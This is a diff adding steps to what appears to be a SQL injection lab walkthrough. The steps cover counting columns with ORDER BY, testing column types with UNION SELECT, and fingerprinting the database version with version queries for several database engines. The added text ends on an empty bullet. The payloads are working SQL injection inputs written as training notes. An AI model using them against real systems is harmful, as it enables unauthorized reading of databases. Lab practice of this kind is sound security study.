@@ -9,5 +9,21 @@
 # Solving The Lab
 - First Find Number of Columns with
 ```
-
+' ORDER by 1--
 ```
+- url encode and change the value untill we got and 3 internal server error so columns are 2
+- now to the columns type we try string and we got 200 response
+```
+' UNION SELECT 'a','a'--
+```
+- now to db version we know from description that its not oracle so we have three options left
+```
+Microsoft-->	SELECT @@version
+PostgreSQL-->	SELECT version()
+MySQL-->	SELECT @@version
+```
+- we tried all but oonly postgresql gave 200 response 
+```
+' UNION  SELECT version(),'a'--
+```
+- 
